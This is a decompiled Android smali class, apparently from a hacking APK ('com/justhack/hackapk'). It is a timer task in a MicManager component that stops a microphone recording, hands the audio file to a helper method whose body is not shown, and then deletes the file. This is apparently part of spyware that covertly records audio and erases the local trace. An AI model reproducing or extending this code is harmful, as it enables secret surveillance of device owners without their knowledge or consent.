.class final Lcom/justhack/hackapk/MicManager$1;
.super Ljava/util/TimerTask;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/justhack/hackapk/MicManager;->startRecording(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 50
    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .line 54
    sget-object v0, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 55
    sget-object v0, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 56
    sget-object v0, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;

    invoke-static {v0}, Lcom/justhack/hackapk/MicManager;->access$000(Ljava/io/File;)V

    .line 57
    sget-object v0, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 58
    return-void
.end method